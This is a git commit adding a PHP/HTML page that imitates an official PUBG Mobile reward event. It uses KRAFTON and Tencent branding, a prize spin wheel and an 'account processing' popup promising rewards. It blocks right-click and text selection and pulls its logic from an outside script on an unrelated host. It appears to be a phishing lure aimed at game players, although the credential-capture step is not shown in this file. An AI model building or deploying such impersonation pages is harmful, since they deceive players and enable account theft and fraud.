b90483cf9353f7aa7a7ece181248f3b56275b3b8
Calinion (Nerd) <159137813+emirofcordoba@users.noreply.github.com>
2025-03-22 21:20:32 +0600

    Create index.php

---
+++ php/pubg/index.php
@@ -0,0 +1,111 @@
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="((PUBG MOBILE))">
+<meta name="description" content="((PUBG MOBILE))">
+<meta property="og:description" content="((PUBG MOBILE))">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="((PUBG MOBILE))">
+<meta property="og:type" content="website">
+<meta name="copyright"content="<?php echo $copyright;?>">
+<meta name="theme-color" content="<?php echo $theme;?>">
+<meta property="og:image" content="<?php echo $image;?>">
+<title>((PUBG MOBILE))</title>
+<link rel="stylesheet" href="https://bloodistan7.pages.dev/pubg/css/style.css">
+<link rel="stylesheet" href="https://bloodistan7.pages.dev/pubg/css/animate.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<link rel="icon" href="<?php echo $icon;?>">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+  
+<div class="container">
+<div class="navbar">
+<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<div class="navbar-title">
+PUBG MOBILE
+<br>
+<span>The original Battle Royale, <br> the first and the best!</span>
+</div> <!--- navbar-title --->
+<div class="navbar-download">
+<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
+<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/pay.png">
+</div> <!--- navbar-download --->
+</div> <!--- navbar --->
+<div class="header">
+<video src="https://bloodistan7.pages.dev/pubg/media/header.mp4" autoplay loop muted></video>
+</div> <!--- header --->
+<div class="alert">
+<img src="https://bloodistan7.pages.dev/pubg/img/season.png">
+<div class="alert-title">Royale Pass Month 1: Tek Era</div>
+</div> <!--- alert --->
+<div class="box">
+<center>
+<div class="wrap">
+<div class="bg">
+<div class="kotak">
+<center>
+<div class="spin">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/1.png">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/2.png">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/3.png">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/4.png">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/5.png">
+<img class="img" src="https://bloodistan7.pages.dev/pubg/img/rewards/6.png">
+</div> <!--- spin --->
+</center>
+<img onclick="spin()" class="start" src="https://bloodistan7.pages.dev/pubg/img/putar.png">
+</div> <!--- kotak --->
+</div> <!--- bg --->
+</div> <!--- wrap --->
+<div class="btn-wrapper">
+<button type="button" onmousedown="buka.play()" onclick="open_about_event()">About Event</button>
+<button type="button" onmousedown="buka.play()" onclick="open_event_rules()">Event Rules</button>
+</div> <!--- btn-wrapper --->
+</center>
+</div> <!--- box --->
+<div class="footer">
+<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
+<center>
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
+</center>
+<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
+<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
+</div> <!--- footer --->
+</div> <!--- container --->
+
+<div class="popup processing_account">
+<div class="popup-box">
+<div class="popup-title">Processing Account</div> <!--- popup-title --->
+<div class="popup-content">
+<br>
+<div class="popup-rewards-title">
+Thank your for joining this event
+<br>
+<br>
+Currently your account has been successfully processing
+<br>
+Please wait up to 24 hours to receive your rewards
+</div> <!--- popup-rewards-title -->
+</div> <!--- popup-content --->
+<div class="popup-btn-wrapper">
+<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onmousedown="tutup.play();" onclick="location.href='https://pubgmobile.com/';">Close</button>
+</div> <!--- popup-btn-wrapper --->
+</div> <!--- popup-box --->
+</div> <!--- processing_account --->
+
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://bloodistan7.pages.dev/pubg/js/click.js"></script>
+
+</body>
+</html>
